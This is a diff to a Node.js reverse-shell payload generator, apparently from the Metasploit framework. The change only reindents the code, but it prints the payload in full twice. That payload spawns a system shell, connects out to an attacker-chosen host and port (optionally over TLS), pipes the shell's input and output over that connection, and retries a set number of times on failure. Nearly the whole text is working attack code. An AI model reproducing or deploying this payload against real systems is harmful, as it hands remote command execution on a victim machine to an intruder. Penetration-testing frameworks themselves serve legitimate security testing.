@@ -57,25 +57,23 @@ module Msf::Payload::NodeJS
             sh = cp.spawn(cmd, []);
         var client = this;
         var counter=0;
-	function StagerRepeat(){
-	  client.socket = net.connect(#{datastore['LPORT']}, "#{lhost}", #{tls_hash} function() {
-            client.socket.pipe(sh.stdin);
-            if (typeof util.pump === "undefined") {
-              sh.stdout.pipe(client.socket);
-              sh.stderr.pipe(client.socket);          
-            } else {
-              util.pump(sh.stdout, client.socket);
-              util.pump(sh.stderr, client.socket);
-            }
-          });
-	  socket.on("error", function(error) {
-	    counter++;
-	    if(counter<= #{datastore['StagerRetryCount']}){
-	      setTimeout(function() {
-                StagerRepeat();
-              }, #{datastore['StagerRetryWait']}*1000);
-            } else
-              process.exit();
+        function StagerRepeat(){
+          client.socket = net.connect(#{datastore['LPORT']}, "#{lhost}", #{tls_hash} function() {
+          client.socket.pipe(sh.stdin);
+          if (typeof util.pump === "undefined") {
+            sh.stdout.pipe(client.socket);
+            sh.stderr.pipe(client.socket);
+          } else {
+            util.pump(sh.stdout, client.socket);
+            util.pump(sh.stderr, client.socket);
+          }
+        });
+        socket.on("error", function(error) {
+          counter++;
+          if(counter<= #{datastore['StagerRetryCount']}){
+            setTimeout(function() { StagerRepeat();}, #{datastore['StagerRetryWait']}*1000);
+          } else
+            process.exit();
           });
         }
         StagerRepeat();
